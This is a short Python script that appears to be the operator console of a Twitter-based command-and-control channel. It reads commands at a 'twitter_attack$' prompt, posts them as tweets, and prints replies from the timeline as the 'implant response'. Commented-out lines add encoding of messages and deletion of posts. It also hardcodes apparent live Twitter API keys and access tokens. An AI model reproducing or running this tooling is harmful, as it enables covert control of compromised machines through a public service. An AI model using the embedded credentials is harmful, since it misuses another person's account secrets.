import tweepy
#from newEncrypt import *
#import os 
import time


consumer_key = 'zLZ2NN1qemQChgVOae3QlgNtp'
consumer_secret = 'hbAZzMFdpff1sDHp50d4qt4l7QumyUfhxSybl5Smne1eTi2mEw'
access_token = '4827323871-Oig9GWZc6gkVUYK7oTkQO1O4dmoJLuCaY8vE6Dh'
access_token_secret = 'h2BMjDxt24XolArqy2vuRJYauMqKp2boNIgWUdHwlmGxD'

auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret )
api = tweepy.API(auth)


############################
#API_KEY = "zLZ2NN1qemQChgVOae3QlgNtp"
#API_SECRET = "hbAZzMFdpff1sDHp50d4qt4l7QumyUfhxSybl5Smne1eTi2mEw" 
#auth = tweepy.AppAuthHandler(API_KEY, API_SECRET)
 
#api = tweepy.API(auth, wait_on_rate_limit=True,
				   #wait_on_rate_limit_notify=True)
#if (not api):
    #print ("Can't Authenticate")
   # sys.exit(-1)
				   
				   

while True:
	var = raw_input("twitter_attack$ ")
	if var == "exit":
		break
	else: 
		#msg = encode(var) 
		api.update_status(var)
		#get and print implant response, might need timing feature
		time.sleep(15)
		new_public_tweets = api.home_timeline()
		count = 0
		
		while count < 1:
			for tweet in new_public_tweets:
				test = str(tweet.text)
				#bytes = str.encode(test)
				#type(bytes)	
				#mess = decode(bytes)
				print test
				count = count + 1
	
	#delete all posts		
	#for tweet in new_public_tweets:
		#api.destroy_status(tweet.id)
			
	
			
		
		
	
